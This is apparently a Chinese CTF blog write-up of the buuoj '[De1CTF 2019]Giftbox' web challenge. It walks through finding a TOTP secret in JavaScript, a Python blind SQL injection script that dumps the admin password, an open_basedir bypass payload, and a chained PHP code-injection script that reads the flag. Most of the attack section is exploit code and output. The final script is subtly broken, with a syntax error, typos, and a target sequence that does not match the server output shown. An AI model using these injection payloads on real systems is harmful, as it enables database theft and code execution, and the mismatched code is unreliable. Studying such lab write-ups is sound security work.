@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8" />
+   
+  <meta name="keywords" content="blog" />
+   
+  <meta name="description" content="晴天`blog" />
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    buuoj刷题记录8 |  晴天`blog
+  </title>
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+  
+<script src="/js/pace.min.js"></script>
+
+
+  
+
+  
+
+<meta name="generator" content="Hexo 4.1.1"><link rel="alternate" href="/atom.xml" title="晴天`blog" type="application/atom+xml">
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    <main class="content">
+      <section class="outer">
+  <article id="post-buuoj刷题记录8" class="article article-type-post" itemscope
+  itemprop="blogPost" data-scroll-reveal>
+
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  buuoj刷题记录8
+</h1>
+  
+
+    </header>
+    
+
+    
+    <div class="article-meta">
+      <a href="/2020/01/12/buuoj%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%958/" class="article-date">
+  <time datetime="2020-01-12T04:57:41.000Z" itemprop="datePublished">2020-01-12</time>
+</a>
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/">刷题记录</a>
+  </div>
+
+    </div>
+    
+
+    
+    
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+      <h2 id="De1CTF-2019-Giftbox"><a href="#De1CTF-2019-Giftbox" class="headerlink" title="[De1CTF 2019]Giftbox"></a>[De1CTF 2019]Giftbox</h2><h3 id="0x00-基础"><a href="#0x00-基础" class="headerlink" title="0x00 基础"></a>0x00 基础</h3><p>totp:TOTP算法(Time-based One-time Password algorithm)是一种从共享密钥和当前时间计算一次性密码的算法。 它已被采纳为Internet工程任务组标准RFC 6238，是Initiative for Open Authentication（OATH）的基石，并被用于许多双因素身份验证系统。TOTP是基于散列的消息认证码（HMAC）的示例。 它使用加密哈希函数将密钥与当前时间戳组合在一起以生成一次性密码。 由于网络延迟和不同步时钟可能导致密码接收者必须尝试一系列可能的时间来进行身份验证，因此时间戳通常以30秒的间隔增加，从而减少了潜在的搜索空间。</p>
+<p>SQL盲注</p>
+<p>open_basedir绕过</p>
+<a id="more"></a>
+
+
+
+<h3 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h3><p>打开网页发现是类似一个linux终端的界面，cd，ls，cat，clear，help，exix，输入help提示可运行下列命令，ls查看后，发现有一个usage.md</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">login [username] [password]</span><br><span class="line"><span class="built_in">logout</span></span><br><span class="line">launch</span><br><span class="line">targeting [code] [position]</span><br><span class="line">destruct</span><br></pre></td></tr></table></figure>
+
+<p>fuzz后发现要登入，登入抓包的时候发现有一个totp参数</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/shell.php?a=login%20admin%20admin&amp;totp=59858608</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 9fc5cb4b-a3ef-4f38-944a-1390b4f71ebf.node3.buuoj.cn</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span>: application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">X-Requested-With</span>: XMLHttpRequest</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Referer</span>: http://9fc5cb4b-a3ef-4f38-944a-1390b4f71ebf.node3.buuoj.cn/</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=urs1ifeeiqsj6dam5rvs0l50nt</span><br></pre></td></tr></table></figure>
+
+<p>进行login时发现username处存在单引号sql盲注，执行usage中其他操作需要登入</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[de1ta@de1ta-mbp /sandbox]% login admin<span class="string">' admin</span></span><br><span class="line"><span class="string">login fail, user not found.</span></span><br><span class="line"><span class="string">[de1ta@de1ta-mbp /sandbox]% login admin'</span><span class="comment"># admin</span></span><br><span class="line">login fail, password incorrect.</span><br><span class="line">[de1ta@de1ta-mbp /sandbox]% targeting</span><br><span class="line">login first.</span><br><span class="line">[de1ta@de1ta-mbp /sandbox]% launch</span><br><span class="line">login first.</span><br></pre></td></tr></table></figure>
+
+<p>查看源码，再main.js发现了数据提交过程，和服务器totp设置</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">···</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">[Developer Notes]</span></span><br><span class="line"><span class="comment">OTP Library for Python located in js/pyotp.zip</span></span><br><span class="line"><span class="comment">Server Params:</span></span><br><span class="line"><span class="comment">digits = 8</span></span><br><span class="line"><span class="comment">interval = 5</span></span><br><span class="line"><span class="comment">window = 1</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">···</span><br><span class="line">···</span><br><span class="line">$.ajax(&#123;</span><br><span class="line">        url: host + <span class="string">'/shell.php?a='</span>+<span class="built_in">encodeURIComponent</span>(input)+<span class="string">'&amp;totp='</span> + <span class="keyword">new</span> TOTP(<span class="string">"GAXG24JTMZXGKZBU"</span>,<span class="number">8</span>).genOTP(),</span><br><span class="line">        type: <span class="string">"GET"</span>,</span><br><span class="line">        dataType: <span class="string">'json'</span>,</span><br><span class="line">        success: <span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">            e_main.html($(<span class="string">'#main'</span>).html() + <span class="string">'[&lt;span id="usr"&gt;'</span> + usrName + <span class="string">'&lt;/span&gt;@&lt;span class="host"&gt;de1ta-mbp&lt;/span&gt; '</span> + position + <span class="string">']% '</span> + input + <span class="string">'&lt;br/&gt;'</span> + res.message + <span class="string">'&lt;br/&gt;'</span>)</span><br><span class="line">            <span class="keyword">if</span> (e_console.height()-$(<span class="built_in">window</span>).height()&gt;<span class="number">0</span>)&#123;e_console.css(<span class="string">'top'</span>,-(e_console.height()-$(<span class="built_in">window</span>).height()));&#125;<span class="keyword">else</span>&#123;e_console.css(<span class="string">'top'</span>,<span class="number">5</span>);&#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        error: <span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">            e_main.html($(<span class="string">'#main'</span>).html() + <span class="string">'[&lt;span id="usr"&gt;'</span> + usrName + <span class="string">'&lt;/span&gt;@&lt;span class="host"&gt;de1ta-mbp&lt;/span&gt; '</span> + position + <span class="string">']% '</span> + input + <span class="string">'&lt;br/&gt;System Fatal Error!&lt;br/&gt;'</span>)</span><br><span class="line">            <span class="keyword">if</span> (e_console.height()-$(<span class="built_in">window</span>).height()&gt;<span class="number">0</span>)&#123;e_console.css(<span class="string">'top'</span>,-(e_console.height()-$(<span class="built_in">window</span>).height()));&#125;<span class="keyword">else</span>&#123;e_console.css(<span class="string">'top'</span>,<span class="number">5</span>);&#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">···</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x02-操作"><a href="#0x02-操作" class="headerlink" title="0x02 操作"></a>0x02 操作</h3><p>编写盲注脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 1/14/2020 9:42 PM</span></span><br><span class="line"><span class="keyword">import</span> pyotp</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(url, payload)</span>:</span></span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    totp = pyotp.TOTP(<span class="string">'GAXG24JTMZXGKZBU'</span>, <span class="number">8</span>, interval=<span class="number">5</span>)</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'a'</span>: <span class="string">"login admin'/**/and/**/("</span>+payload+<span class="string">")# admin"</span>,</span><br><span class="line">        <span class="string">'totp'</span>: totp.now()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># print(params)</span></span><br><span class="line">    html = requests.get(url,params=params,).text</span><br><span class="line">    <span class="comment"># print(html)</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binsea</span><span class="params">(s_payload,len=<span class="number">64</span>)</span>:</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, len+<span class="number">1</span>):</span><br><span class="line">        left = <span class="number">0</span></span><br><span class="line">        right = <span class="number">126</span></span><br><span class="line">        <span class="keyword">while</span> left &lt;= right:</span><br><span class="line">            mid = (left + right) / <span class="number">2</span></span><br><span class="line">            payload = <span class="string">"ascii(substr((%s),%d,1))&gt;%d"</span> % (s_payload,x, mid)</span><br><span class="line">            url = <span class="string">'http://257c0b3b-d0fb-4a75-811f-d763da9af540.node3.buuoj.cn/shell.php'</span></span><br><span class="line">            html = get(url, payload)</span><br><span class="line">            <span class="comment"># print(html, '*-*-*-*-*-*', mid)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'password'</span> <span class="keyword">in</span> html:</span><br><span class="line">                left = mid +<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid <span class="number">-1</span></span><br><span class="line">        mid = int((left + right + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">        result += chr(mid)</span><br><span class="line">        print(result)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_database</span><span class="params">()</span>:</span></span><br><span class="line">    s_payload=<span class="string">'database()'</span></span><br><span class="line">    database = binsea(s_payload,<span class="number">7</span>)</span><br><span class="line">    print(database)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_tabls</span><span class="params">()</span>:</span></span><br><span class="line">    s_payload = <span class="string">'select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=\'giftbox\''</span></span><br><span class="line">    tables=binsea(s_payload,<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_columns</span><span class="params">()</span>:</span></span><br><span class="line">    s_payload = <span class="string">'select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=\'users\''</span></span><br><span class="line">    columns=binsea(s_payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span><span class="params">()</span>:</span></span><br><span class="line">    s_payload=<span class="string">'select/**/concat(password)/**/from/**/users'</span></span><br><span class="line">    password=binsea(s_payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment"># get_database()</span></span><br><span class="line">    <span class="comment"># get_tabls()</span></span><br><span class="line">    <span class="comment"># get_columns()</span></span><br><span class="line">    <span class="comment"># get_data()</span></span><br></pre></td></tr></table></figure>
+
+<p>数据库是giftbox,只有一个users表，有<code>id,username,password</code></p>
+<p>admin的密码是<code>hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}</code></p>
+<p>根据密码的提示得到</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[de1ta@de1ta-mbp &#x2F;sandbox]% sh0w_hiiintttt_23333</span><br><span class="line">we add an evil monster named &#39;eval&#39; when launching missiles.</span><br></pre></td></tr></table></figure>
+
+<p>targeting  还有长度限制，code为2，possition为12。</p>
+<p>在phpiofo中设置了open_basedir</p>
+<p><img src="/pic/37.png" alt=""></p>
+<p>关于open_basedir<br>   open_basedir是php.ini中的一个配置选项<br>   它可将用户访问文件的活动范围限制在指定的区域，<br>   假设open_basedir=/home/wwwroot/home/web1/:/tmp/，那么通过web1访问服务器的用户就无法获取服务器上除了/home/wwwroot/home/web1/和/tmp/这两个目录以外的文件。<br>   注意用open_basedir指定的限制实际上是前缀,而不是目录名。<br>   举例来说: 若”open_basedir = /dir/user”, 那么目录 “/dir/user” 和 “/dir/user1”都是可以访问的。所以如果要将访问限制在仅为指定的目录，请用斜线结束路径名。</p>
+<p><a href="https://www.cnblogs.com/cimuhuashuimu/p/11544487.html" target="_blank" rel="noopener">绕过参考文章</a></p>
+<p>绕过payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir(&#39;img&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;&#x2F;&#39;);echo(file_get_contents(&#39;flag&#39;));&#96;</span><br></pre></td></tr></table></figure>
+
+<p>附上完整脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time    : 1/14/2020 9:42 PM</span></span><br><span class="line"><span class="keyword">import</span> pyotp</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">sesssion=requests.session()</span><br><span class="line">url = <span class="string">'http://257c0b3b-d0fb-4a75-811f-d763da9af540.node3.buuoj.cn/shell.php'</span></span><br><span class="line">totp = pyotp.TOTP(<span class="string">'GAXG24JTMZXGKZBU'</span>, <span class="number">8</span>, interval=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(url, payload)</span>:</span></span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'a'</span>: <span class="string">"login admin'/**/and/**/("</span>+payload+<span class="string">")# admin"</span>,</span><br><span class="line">        <span class="string">'totp'</span>: totp.now()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment"># print(params)</span></span><br><span class="line">    html = requests.get(url,params=params,).text</span><br><span class="line">    <span class="comment"># print(html)</span></span><br><span class="line">    <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binsea</span><span class="params">(s_payload,len=<span class="number">64</span>)</span>:</span></span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, len+<span class="number">1</span>):</span><br><span class="line">        left = <span class="number">0</span></span><br><span class="line">        right = <span class="number">126</span></span><br><span class="line">        <span class="keyword">while</span> left &lt;= right:</span><br><span class="line">            mid = (left + right) / <span class="number">2</span></span><br><span class="line">            payload = <span class="string">"ascii(substr((%s),%d,1))&gt;%d"</span> % (s_payload,x, mid)</span><br><span class="line"></span><br><span class="line">            html = get(url, payload)</span><br><span class="line">            <span class="comment"># print(html, '*-*-*-*-*-*', mid)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">'password'</span> <span class="keyword">in</span> html:</span><br><span class="line">                left = mid +<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                right = mid <span class="number">-1</span></span><br><span class="line">        mid = int((left + right + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">        result += chr(mid)</span><br><span class="line">        print(result)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_database</span><span class="params">()</span>:</span></span><br><span class="line">    s_payload=<span class="string">'database()'</span></span><br><span class="line">    database = binsea(s_payload,<span class="number">7</span>)</span><br><span class="line">    print(database)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_tabls</span><span class="params">()</span>:</span></span><br><span class="line">    s_payload = <span class="string">'select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=\'giftbox\''</span></span><br><span class="line">    tables=binsea(s_payload,<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_columns</span><span class="params">()</span>:</span></span><br><span class="line">    s_payload = <span class="string">'select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=\'users\''</span></span><br><span class="line">    columns=binsea(s_payload,<span class="number">23</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_data</span><span class="params">()</span>:</span></span><br><span class="line">    s_payload=<span class="string">'select/**/concat(password)/**/from/**/users'</span></span><br><span class="line">    password=binsea(s_payload,<span class="number">13</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'a'</span>: <span class="string">"login admin hint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125;"</span>,</span><br><span class="line">        <span class="string">'totp'</span>: totp.now()</span><br><span class="line">    &#125;</span><br><span class="line">    sesssion.get(url, params=params)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">target</span><span class="params">(code,position)</span>:</span></span><br><span class="line"></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'a'</span>: <span class="string">"targeting"</span>+code+<span class="string">' '</span>+position,</span><br><span class="line">        <span class="string">'totp'</span>: totp.now()</span><br><span class="line">    &#125;</span><br><span class="line">    sesssion.get(url,params=params)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">destruct</span><span class="params">()</span>:</span></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'a'</span>: <span class="string">"destruct"</span>,</span><br><span class="line">        <span class="string">'totp'</span>: totp.now()</span><br><span class="line">    &#125;</span><br><span class="line">    sesssion.get(url, params=params)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">launch</span><span class="params">()</span>:</span></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'a'</span>: <span class="string">'launch'</span>,</span><br><span class="line">        <span class="string">'totp'</span>: totp.now()</span><br><span class="line">    &#125;</span><br><span class="line">    print(sesssion.get(url, params=params).json())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_password</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># get_database()</span></span><br><span class="line">    <span class="comment"># get_tabls()</span></span><br><span class="line">    <span class="comment"># get_columns()</span></span><br><span class="line">    get_data()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">()</span>:</span></span><br><span class="line">    login()</span><br><span class="line">    target(<span class="string">'a'</span>,<span class="string">'chdir'</span>)</span><br><span class="line">    target(<span class="string">'b'</span>,<span class="string">'img'</span>)</span><br><span class="line">    target(<span class="string">'c'</span>,<span class="string">'&#123;$a($b)&#125;'</span>)</span><br><span class="line"></span><br><span class="line">    target(<span class="string">'d'</span>,<span class="string">'ini_set'</span>)</span><br><span class="line">    target(<span class="string">'e'</span>, <span class="string">'open_base_dir'</span>)</span><br><span class="line">    target(<span class="string">'f'</span>, <span class="string">'..'</span>)</span><br><span class="line">    target(<span class="string">'g'</span>, <span class="string">'&#123;$d($e,$f)&#125;'</span>)</span><br><span class="line"></span><br><span class="line">    target(<span class="string">'h'</span>, <span class="string">'&#123;$a($f)&#125;'</span>)</span><br><span class="line"></span><br><span class="line">    target(<span class="string">'i'</span>, <span class="string">'&#123;$a($f)&#125;'</span>)</span><br><span class="line"></span><br><span class="line">    target(<span class="string">'j'</span>, <span class="string">'&#123;$a($f)&#125;'</span>)</span><br><span class="line"></span><br><span class="line">    target(<span class="string">'k'</span>,<span class="string">'&#123;$a($f)&#125;'</span> )</span><br><span class="line"></span><br><span class="line">    target(<span class="string">'l'</span>, <span class="string">'/'</span>)</span><br><span class="line">    target(<span class="string">'m'</span>, <span class="string">'&#123;$d($e,$l)&#125;'</span>)</span><br><span class="line"></span><br><span class="line">    target(<span class="string">'n'</span>, <span class="string">'eaho'</span>)</span><br><span class="line">    target(<span class="string">'o'</span>, <span class="string">'file_get_'</span>)</span><br><span class="line">    target(<span class="string">'p'</span>, <span class="string">'contents'</span>)</span><br><span class="line">    target(<span class="string">'q'</span>, <span class="string">'$o$p'</span>)</span><br><span class="line">    target(<span class="string">'r'</span>, <span class="string">'flag'</span>)</span><br><span class="line">    target(<span class="string">'s'</span>,<span class="string">'&#123;$n($q(r))&#125;'</span> )</span><br><span class="line">    launch()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	get_flag():</span><br></pre></td></tr></table></figure>
+
+<p>返回结果</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;'code': 0, 'message': 'Initializing launching system...&lt;br&gt;Setting target: $a = "chdir";&lt;br&gt;Reading target: $a = "chdir";&lt;br&gt;Setting target: $b = "img";&lt;br&gt;Reading target: $b = "img";&lt;br&gt;Setting target: $c = "&#123;$a($b)&#125;";&lt;br&gt;Reading target: $c = "1";&lt;br&gt;Setting target: $d = "ini_set";&lt;br&gt;Reading target: $d = "ini_set";&lt;br&gt;Setting target: $e = "open_basedir";&lt;br&gt;Reading target: $e = "open_basedir";&lt;br&gt;Setting target: $f = "..";&lt;br&gt;Reading target: $f = "..";&lt;br&gt;Setting target: $g = "&#123;$d($e,$f)&#125;";&lt;br&gt;Reading target: $g = "/app:/sandbox";&lt;br&gt;Setting target: $h = "&#123;$a($f)&#125;";&lt;br&gt;Reading target: $h = "1";&lt;br&gt;Setting target: $i = "&#123;$a($f)&#125;";&lt;br&gt;Reading target: $i = "1";&lt;br&gt;Setting target: $j = "Ly8v";&lt;br&gt;Reading target: $j = "Ly8v";&lt;br&gt;Setting target: $k = "base64_";&lt;br&gt;Reading target: $k = "base64_";&lt;br&gt;Setting target: $l = "decode";&lt;br&gt;Reading target: $l = "decode";&lt;br&gt;Setting target: $m = "$k$l";&lt;br&gt;Reading target: $m = "base64_decode";&lt;br&gt;Setting target: $n = "&#123;$m($j)&#125;";&lt;br&gt;Reading target: $n = "///";&lt;br&gt;Setting target: $o = "&#123;$d($e,$n)&#125;";&lt;br&gt;Reading target: $o = "..";&lt;br&gt;Setting target: $p = "flag";&lt;br&gt;Reading target: $p = "flag";&lt;br&gt;Setting target: $q = "file_get";&lt;br&gt;Reading target: $q = "file_get";&lt;br&gt;Setting target: $r = "_contents";&lt;br&gt;Reading target: $r = "_contents";&lt;br&gt;Setting target: $s = "$q$r";&lt;br&gt;Reading target: $s = "file_get_contents";&lt;br&gt;Setting target: $t = "&#123;$s($p)&#125;";&lt;br&gt;Reading target: $t = "flag&#123;dd8dcd47-5bce-4fe2-b2ee-f2aec667ddd3&#125;\n";&lt;br&gt;3..2..1..Fire!&lt;br&gt;All 20 missiles are 